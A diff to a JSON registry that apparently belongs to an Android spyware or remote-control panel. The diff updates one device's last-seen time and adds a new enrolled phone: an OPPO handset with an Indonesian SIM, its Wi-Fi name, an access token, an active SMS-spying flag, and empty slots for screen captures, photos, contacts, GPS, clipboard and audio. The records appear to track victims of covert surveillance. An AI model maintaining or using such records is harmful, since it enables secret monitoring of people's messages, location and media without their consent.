@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776764946207,
+    "lastSeen": 1776764963932,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -4035,5 +4035,37 @@
       ],
       "receivedAt": 1776762198031
     }
+  },
+  {
+    "deviceId": "pxc_1c098691",
+    "deviceName": "HP-AUBREY-899E",
+    "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
+    "token": "3cfe8ffe8872f32822087d633ebd4fe4",
+    "lastSeen": 1776764966839,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-21T09:49:26.839Z",
+    "deviceInfo": {
+      "model": "OPPO CPH2641",
+      "androidVersion": "Android 15",
+      "battery": 91,
+      "network": "WiFi: RITA",
+      "sim1": "TSEL-MELAYANISEPENUHHATI",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
